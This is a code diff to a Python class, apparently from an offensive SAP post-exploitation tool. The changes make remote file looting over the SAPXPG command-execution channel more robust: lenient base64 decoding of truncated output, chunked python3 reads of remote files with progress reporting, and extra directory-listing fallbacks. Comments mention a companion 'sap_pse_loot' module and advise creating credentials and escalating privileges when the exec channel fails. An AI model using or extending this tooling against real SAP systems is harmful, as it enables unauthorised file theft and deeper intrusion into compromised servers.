@@ -528,6 +528,14 @@ class TargetFS:
         failure so the operator can see which channel was tried.
         """
         # --- Path 1: /usr/bin/base64 (no python3 required) ------------
+        # SAPXPG's stdout capture can silently drop the tail of long
+        # outputs — a 76-char/line b64 stream from a multi-KB file
+        # arrives short and the size-check catches it.  If instead
+        # only INTERIOR lines are dropped, the total length is not a
+        # multiple of 4 and decoding raises "Incorrect padding"; we
+        # pad with '=' and retry with validate=False so the partial
+        # data is still recovered and the size-check decides what to
+        # do next.
         base64_paths = ("/usr/bin/base64", "/bin/base64",
                          "/usr/local/bin/base64")
         for b64_bin in base64_paths:
@@ -545,8 +553,12 @@ class TargetFS:
             b64_clean = re.sub(r"[^A-Za-z0-9+/=]", "", b64_blob)
             if not b64_clean:
                 continue
+            # Pad to a multiple of 4 and use lenient decode — the
+            # SAPXPG stream can drop bytes without warning.
+            padded = b64_clean.rstrip("=") \
+                + "=" * ((4 - len(b64_clean.rstrip("=")) % 4) % 4)
             try:
-                decoded = base64.b64decode(b64_clean, validate=True)
+                decoded = base64.b64decode(padded, validate=False)
             except Exception as e:
                 print(f"[-] {self.label}: {b64_bin} b64 decode error: "
                       f"{e!r} — trying next path")
@@ -557,7 +569,8 @@ class TargetFS:
                 return decoded
             print(f"[-] {self.label}: {b64_bin} returned "
                   f"{len(decoded)} B, expected {size} — "
-                  f"probably TLV-truncated, falling back to chunked read")
+                  f"SAPXPG probably truncated stdout, falling back "
+                  f"to python3 chunked read")
             break
 
         # --- Path 2: python3 chunked read ------------------------------
@@ -572,13 +585,24 @@ class TargetFS:
         # ceiling most kernels enforce.  Same value used by
         # sap_pse_loot for the same reason.
         RAW_CHUNK = 72
+        # Emit progress at ~10 evenly-spaced points so a multi-MB
+        # download doesn't look wedged.
+        n_chunks = (size + RAW_CHUNK - 1) // RAW_CHUNK
+        progress_every = max(1, n_chunks // 10)
+        print(f"[*] {self.label}: chunked download of {remote_path} "
+              f"({size} B, {n_chunks} chunks of {RAW_CHUNK} B via {spec})")
         parts = []
         offset = 0
+        chunk_idx = 0
         while offset < size:
             end = min(offset + RAW_CHUNK, size)
+            # Use print() not sys.stdout.write() — print() auto-flushes
+            # via the atexit handler even when the subprocess is
+            # killed early by SAPXPG timeouts (Julian's issue #8
+            # showed sys.stdout.write() silently losing output when
+            # sapxpg dropped the child mid-flight).
             body = (f"-c "
-                     f"__import__('sys').stdout.write("
-                     f"__import__('base64').b64encode("
+                     f"print(__import__('base64').b64encode("
                      f"open('{remote_path}','rb').read()[{offset}:{end}]"
                      f").decode())")
             cmd, params = _py3_params(spec, body)
@@ -586,16 +610,50 @@ class TargetFS:
             b64_blob = "".join(r.get("output", []))
             b64_clean = re.sub(r"[^A-Za-z0-9+/=]", "", b64_blob)
             if not b64_clean:
+                # First-chunk empty is worth diagnosing: dump the raw
+                # output list so the operator can see whether python3
+                # crashed with a permission error, exec channel died,
+                # etc.  Without this the failure looks like a mystery.
+                raw = r.get("output", [])
+                err = r.get("error", "")
                 print(f"[-] {self.label}: chunk at offset {offset} "
                       f"returned empty — download aborted")
+                print(f"[-] {self.label}:   exec success={r.get('success')} "
+                      f"error={err[:120]!r}")
+                print(f"[-] {self.label}:   raw output lines "
+                      f"({len(raw)}): "
+                      f"{[l[:80] for l in raw[:3]]}")
+                # Try to help the operator: verify python3 is actually
+                # runnable by running a trivial print.
+                probe = self.exec_fn(cmd, "-c print(42)")
+                probe_out = probe.get("output", [])
+                if not any("42" in ln for ln in probe_out):
+                    print(f"[-] {self.label}:   python3 probe "
+                          f"'print(42)' also failed — interpreter "
+                          f"unusable via this channel.  Try SXPG "
+                          f"(create credentials + escalate first).")
+                else:
+                    print(f"[-] {self.label}:   python3 probe "
+                          f"'print(42)' succeeded — likely a read "
+                          f"permission issue on {remote_path} for "
+                          f"the exec channel's user (<sid>adm).")
                 return None
+            # Lenient decode — pad to multiple of 4 first
+            padded = b64_clean.rstrip("=") \
+                + "=" * ((4 - len(b64_clean.rstrip("=")) % 4) % 4)
             try:
-                parts.append(base64.b64decode(b64_clean, validate=True))
+                parts.append(base64.b64decode(padded, validate=False))
             except Exception as e:
                 print(f"[-] {self.label}: chunk at offset {offset} "
                       f"b64 decode failed: {e!r}")
                 return None
             offset = end
+            chunk_idx += 1
+            if chunk_idx == 1 or chunk_idx == n_chunks \
+                    or chunk_idx % progress_every == 0:
+                pct = (chunk_idx * 100) // n_chunks
+                print(f"[*] {self.label}: chunk {chunk_idx}/{n_chunks} "
+                      f"({pct}%) — {end}/{size} B")
         return b"".join(parts)
 
     def _list_dir_linux(self, remote_path: str) -> dict:
@@ -680,25 +738,30 @@ class TargetFS:
         # --- Strategy 3: find -printf (SAPXPG-friendly compact) -----
         # Kicks in when both ls variants produced zero parseable
         # entries (very common on /tmp, /etc, /var/log with dozens
-        # or hundreds of entries).
+        # or hundreds of entries).  _list_dir_via_find returns None
+        # for "nothing came back" — we treat that as "keep trying".
         need_find = (not lines) or all(
             _parse_ls_line(l) is None for l in lines
         )
         if need_find:
             find_entries = self._list_dir_via_find(remote_path)
-            if find_entries is not None:
-                # find_entries is [] for genuinely-empty dirs — that's
-                # a successful result, not a fallback failure.
+            if find_entries:  # non-empty list
                 return {"ok": True, "path": remote_path,
                          "entries": find_entries, "error": ""}
 
+            # --- Strategy 4: ls -1a (names only — last resort) ------
+            ls1_entries = self._list_dir_via_ls1(remote_path)
+            if ls1_entries:
+                return {"ok": True, "path": remote_path,
+                         "entries": ls1_entries, "error": ""}
+
         if not lines:
             return {"ok": False, "path": remote_path, "entries": [],
-                     "error": (f"ls returned no output for "
-                               f"{remote_path} — the exec channel "
-                               f"dropped its stdout (kernel-793 TLV "
-                               f"cap, or SAPXPG output limit).  Try a "
-                               f"smaller subdirectory.")}
+                     "error": (f"ls / find / ls -1a all returned no "
+                               f"parseable output for {remote_path} "
+                               f"— the exec channel dropped its "
+                               f"stdout.  Check the console for the "
+                               f"raw output diagnostics.")}
 
         entries = []
         seen = set()
@@ -727,7 +790,8 @@ class TargetFS:
 
         Returns:
             list of entry dicts on success (empty list == empty dir),
-            or None when find is unavailable / stdout still dropped.
+            or None when find is unavailable / stdout still dropped
+            / nothing parseable came back.
         """
         printf_fmt = ("%y|%m|%s|%TY-%Tm-%TdT%TH:%TM:%TS|%f\\n")
         for find_bin in ("/usr/bin/find", "/bin/find"):
@@ -770,6 +834,63 @@ class TargetFS:
                     "mtime":  mtime,
                     "mode":   mode,
                 })
+            if entries:
+                print(f"[*] {self.label}: find fallback → "
+                      f"{len(entries)} entries in {remote_path}")
+                return entries
+            # find returned lines but nothing parsed.  Log the first
+            # few for diagnostics — usually means SAPXPG mangled the
+            # `\n` in -printf so all entries came back concatenated
+            # on one line.
+            print(f"[-] {self.label}: find returned "
+                  f"{len(lines)} lines but no parseable entries — "
+                  f"raw sample: {[l[:80] for l in lines[:2]]}")
+            return None
+        return None
+
+    def _list_dir_via_ls1(self, remote_path: str) -> Optional[list]:
+        """Last-resort: ``ls -1a`` names-only listing.
+
+        No metadata (size / mode / mtime shown as blank), but at
+        <20 B/entry it survives even a heavily-buffered SAPXPG
+        stdout channel.  Used when both ls -la AND find failed to
+        return anything parseable.  The file browser degrades
+        gracefully — folders vs files are re-checked via stat
+        when the operator navigates into one.
+        """
+        r = self.exec_fn("/bin/ls", f"-1a {remote_path}")
+        lines = r.get("output", []) or []
+        if not lines:
+            return None
+        first_lo = lines[0].lower()
+        if "no such" in first_lo or "cannot" in first_lo:
+            return None
+        entries = []
+        seen = set()
+        for line in lines:
+            name = line.strip()
+            if not name or name in (".", ".."):
+                continue
+            # ls -1 can also emit summary lines on some builds; skip
+            # anything with whitespace inside.
+            if " " in name or "\t" in name:
+                continue
+            if name in seen:
+                continue
+            seen.add(name)
+            # Best-effort is_dir guess: trailing slash if present.
+            is_dir = name.endswith("/")
+            entries.append({
+                "name":   name.rstrip("/"),
+                "size":   0,
+                "is_dir": is_dir,
+                "mtime":  "",
+                "mode":   "",
+            })
+        if entries:
+            print(f"[*] {self.label}: ls -1a last-resort fallback → "
+                  f"{len(entries)} entries in {remote_path} "
+                  f"(no metadata — dir/file inferred on navigate)")
             return entries
         return None
 
